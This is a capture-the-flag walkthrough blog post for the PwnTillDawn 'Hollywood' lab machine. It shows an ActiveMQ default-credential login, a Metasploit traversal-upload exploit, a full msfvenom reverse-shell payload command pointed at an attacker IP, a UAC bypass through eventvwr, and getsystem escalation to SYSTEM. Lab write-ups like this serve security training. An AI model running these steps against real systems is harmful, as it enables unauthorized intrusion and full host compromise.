---
title: Hollywood Writeup PwnTillDawn
author: r0b0tG4nG
date: 2021-11-27 01:33:00 +0000
categories: [Blogging, PwnTillDawn]
tags: [writeups, tomcat, activemq, msfconsole]
math: true
mermaid: true
---

![image](https://user-images.githubusercontent.com/67085453/143771170-b81a10a3-ee70-4748-9d22-a333f4934b5f.png)<br>

**> Information Gathering**<br>
The Default nmap scan showed many active ports on the target. We can see some major ports like `21 (ftp), 25 (smtp), 80 (http), 110 (pop3) 445 (smb), 8080 (tomcat) & 8161 (activemq)`. <br>

`xampp` was found running on the default port 80, directory bruteforcing this page did not yield any results.<br>
![image](https://user-images.githubusercontent.com/67085453/143771194-f7c03df2-0b7d-423d-b38b-0274a88dbb23.png)<br> 

Apache tomcat was setup on port 8080 with `host-manager` login disallowed and the default tomcat credentials did not work on `manager app`. <br>
![image](https://user-images.githubusercontent.com/67085453/143771198-a5910e2c-4eb6-4ea6-8df5-d4113b33f42e.png)<br>

Digging deeper on port 8161, we found apache activemq running.<br>
![image](https://user-images.githubusercontent.com/67085453/143771202-66596cba-e76d-4bfd-a775-823b50e39e77.png)<br>

The first thing i always do is to try the default login creds on webapps. I tried to login with the default username and password `admin:admin` on activemq just like we did on tomcat.<br>
![image](https://user-images.githubusercontent.com/67085453/143771208-19a45234-1010-4920-9086-18e4e135cb26.png)<br>

Luckily for us, the default `admin:admin` worked and we logged in succesfully.<br>
![image](https://user-images.githubusercontent.com/67085453/143771218-f4d9d7bf-0fb8-4199-90b9-0281d43289bc.png)<br>

On the admin dashboard, the version of activemq rnning on the taret is `5.11.1`. We performed a quick google to find any know exploit.<br>
![image](https://user-images.githubusercontent.com/67085453/143771230-8430ca4d-2bf9-45d1-bb9e-bbbe5a968b57.png)<br>

We found a approved exploit from <a href="https://www.rapid7.com/db/modules/exploit/windows/http/apache_activemq_traversal_upload/">rapid7</a>. <br>
![image](https://user-images.githubusercontent.com/67085453/143771368-bc57ac26-72a0-4f4e-b982-31ca164bcce7.png)<br>

Load this module into `msfconsole` using `use windows/http/apache_activemq_traversal_upload`, setup the required module options for this exploit. `RHOST`, `RPORT`, `USERNAME`, `PASSWORD` & `LHOST`. Without these module options setup, the exploit will fail to execute.<br>
![image](https://user-images.githubusercontent.com/67085453/143771382-28b2af4e-35e5-4a15-8943-320554dfcb98.png)<br>

All module options set?? then launch an attack using either `run` or `exploit` command in `msfconsole`. If successful, we should spawn a shell on the target.<br>
![image](https://user-images.githubusercontent.com/67085453/143771399-c81cb79d-42f1-4581-92fb-5e861807d80f.png)<br>

**> Post Exploitation**<br>

Winpeas and other tools did not provide me with any good information. So i decided to create a staged payload using `msfvenom`. To create a payload, use this `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.66.66.78 LPORT=4444 -f exe -o test.exe`<br>
![image](https://user-images.githubusercontent.com/67085453/143771410-6614f216-ceec-4ae4-9e1e-58a4c030113a.png)<br>

Then transfered this to the target, setup another msfconsole listerner then executed the `test.exe` on the target.<br>
![image](https://user-images.githubusercontent.com/67085453/143771419-56228f2b-f9e5-4c66-8e57-70a71dc04142.png)<br>

We should have another session in the new `msfconsole` listerner. Lets background this session using the command `bg` or `background`. Load `msfconsole` post exploitation module by typing `use post/multi/recon/local_exploot_suggester`. Once the the module is loaded, set the session to your current session using `set session (session number)` and type run.<br>
![image](https://user-images.githubusercontent.com/67085453/143771432-c57fcd1c-60ce-43ea-b241-89537af6b48a.png)<br>

After waiting for sometime for the results of the post module, we realized we could bypass `User Account Control` to become `NT AUTHORITY\SYSTEM`. To do this, we need to load the module `exploit/windows/local/bypassuac_eventvwr`, set `session` and `lhost` then execute the exploit again using either `run` or `exploit`.<br>
![image](https://user-images.githubusercontent.com/67085453/143771442-baefc788-52c1-4ed2-81e5-76ffe38ea966.png)<br>

This module will bypass` Windows UAC` by hijacking a special key in the `Registry` under the current user hive, and inserting a custom command that will get invoked when the `Windows Event Viewer` is launched. We have successfuly hijacked `C:\Windows\System32\eventvwr.exe` on the target But we are still not administrator. So we will use the `getsystem` command. This comand will use a number of different techniques in attempt to gain SYSTEM level privileges on the target<br>
![image](https://user-images.githubusercontent.com/67085453/143771472-beff3526-d40a-4072-badd-7653a1c0e897.png)<br>

The technique worked and we are `NT AUTHORITY\SYSTEM` though the `Named Pipe Impersonation` technique. We have fully compromised this target.<br>
![image](https://user-images.githubusercontent.com/67085453/143771478-9e61baa0-5704-416a-8d9f-bb14ee0c0963.png)<br>


Referrence: <a href="https://online.pwntilldawn.com/">PwnTillDawn Online battlefield</a>
